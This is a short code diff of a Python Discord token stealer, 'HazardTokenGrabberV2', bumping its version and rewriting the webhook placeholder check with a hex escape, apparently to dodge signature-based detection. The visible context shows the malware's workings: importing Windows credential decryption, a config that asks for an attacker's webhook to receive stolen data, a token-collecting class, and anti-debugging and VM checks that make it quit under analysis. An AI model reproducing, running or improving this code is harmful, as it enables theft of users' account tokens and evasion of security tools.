@@ -23,7 +23,7 @@ from win32crypt import CryptUnprotectData
 from datetime import datetime, timezone, timedelta
 
 __author__ = "Rdimo"
-__version__ = '1.8.5'
+__version__ = '1.8.6'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -229,7 +229,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
+        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
             os._exit(0)
         if self.fetch_conf('anti_debug') and AntiDebug().inVM:
             os._exit(0)
